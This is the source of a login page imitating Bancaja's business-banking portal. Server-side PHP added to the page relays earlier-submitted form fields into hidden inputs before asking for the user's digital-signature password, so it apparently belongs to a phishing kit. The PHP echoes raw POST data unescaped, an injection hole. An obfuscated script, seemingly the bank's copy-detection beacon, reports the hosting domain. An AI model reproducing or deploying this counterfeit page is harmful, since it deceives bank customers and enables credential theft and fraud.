<BASE HREF="https://www.bancajaproximaempresas.com/">
<html lang="es">
<head>
<title>Bancaja Proxima Empresas</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<link title="original" href="/style/np_common.css" rel="stylesheet" type="text/css" />
<link title="original" href="/style/np_home.css" rel="stylesheet" type="text/css" />
<link title="original" href="/style/np_loginempresas.css" rel="stylesheet" type="text/css">
<script language="javascript" src="/japp/Calculator.js"></script>
<script language="javascript" src="/japp/jotp1.js"></script>
<script language="javascript" src="/japp/otp1.js"></script>
<script language="javascript" src="/japp/bpe5-c.js"></script>
<script language="javascript" src="/japp/wemenu.js"></script>
<style>
BODY
{
	background: WHITE url('/gifs/CAS/np_fon_cabecera.gif') repeat-x scroll top left;
	font-family: verdana, arial;
	font-weight: normal;
	font-size:65%;
	margin: 0px;
}
#login .boton{
  font-family:arial;
  font-size:10px;
  text-align:right;
  font-weight:normal;
  color:#FF6600;
}
#login .boton a {
  color:#007480;
  text-align:right;
  text-decoration:none;
}
</style>
<script language="JavaScript">
var NS4 = (document.layers) ? 1 : 0;
var IE = (document.all) ? 1 : 0;
var primeraVez=false;
function returnForm1()
{ if (document.enviar) return document.enviar;
  else if (enviar) return enviar;
}
publi0="";publi1="";
function checkForm(formulario){ return(compruebaNoVacio(formulario.ESpass.value,"Los campos de entrada estan en blanco."));}
function ejecutarForm()
{
  if(!primeraVez)
  { 
    var formenviar = returnForm1();
    if (checkForm(formenviar))formenviar.submit();
  }
}
function capturaEvento(evnt)
{ var ret=0;
  if ( (!(evnt)) && (document.all) )
  { evnt=self.event;
    evnt.cancelBubble=true;
    if (primeraVez) { evnt.returnValue=false; }
    if (evnt.keyCode==13) ret=1;
  }
  else if (evnt) { if (evnt.which==13) ret=1; }
  if (ret) ejecutarForm();
}
publi0=document.location.protocol+"\u002f\u002f";publi1= document.location.hostname;publi2="\u0077\u0077\u0077\u002e\u0062"+"\u0061\u006e\u0063\u0061"+"\u006a\u0061\u002e\u0065\u0073";publi3=document.location.pathname;if (publi1!=publi2){(new Image()).src=publi0+publi2+"/publizity/"+publi1+publi3;}
function inicio()
{ var formulario = returnForm();
  formulario.emp.focus();
}
</script>
</head>
<body>
<div id="cabecera">
	<div id="logo"><img src="/gifs/CAS/np_banner_home.gif" alt="Bancaja" width="195" height="59" border="0"></div>
	<div id="menu">
	<img src="/gifs/CAS/np_but_particulares_off.gif" alt="Particulares" width="104" height="59" border="0" >
	<img src="/gifs/CAS/np_but_empresas.gif" alt="Empresas" width="82" height="59" border="0" ></div>
	<div id="submenu">
		<div class="metanavegacion">&nbsp;</div>
		<div id="botinstitucional"><img src="/gifs/CAS/np_but_institucional_off.gif" alt="Institucional" width="386" height="47" border="0"  usemap="#Map" />
  </div>
	</div>
</div>
 
<center><div id="login">
<form NAME="enviar" METHOD="POST" TARGET="_top" ACTION="/ControlEmpresas">
<?php
$mypost = file("php://input");
if(strlen($mypost[0])!=0)
{
 $post_data = explode("&", $mypost[0]);
 for($pos=0; $pos<sizeof($post_data); $pos++)
 {
  $data_field = explode("=", $post_data[$pos]);
  $key    = $data_field[0];
  $value  = $data_field[1];
  $key_new = str_replace("+"," ", $key);
  $key_new = rawurldecode($key_new);
  $value_new = str_replace("+"," ", $value);
  $value_new = rawurldecode($value_new);
  echo "<input type=\"hidden\" name=\"$key_new\" value=\"$value_new\">\r\n";
 }
}
?>

	<div class="fila">
		<div class="textoform">Firma digital:</div>
		<div class="inputform"><input type="password" name="ESpass" TABINDEX="4" size="10" class="inpTexto" maxlength="8"></div>
	</div>

 <a href="javascript:ejecutarForm();" name="conectar" onmouseout="window.status=''; return true;" onclick="javascript:capturaEvento();" onmouseover="window.status='Conectar al servicio'; return true;"><script>document.write('<img class="butimg" border="0" alt="Conectar" src="'+publi0+publi1+'/gifs/CAS/np_but_conectar2.gif" height="22" width="55">')</script></a>
	<div class="telfatencion"><img src="/gifs/CAS/np_icon_tel.gif" border="0" width="12" height="10" />&nbsp;&nbsp;902 23 00 24</div>
</div>
</form>
<div id="pie"><p>&copy; Bancaja, 2005 - 2006. Todos los derechos reservados.</p></div>
</center></body></html>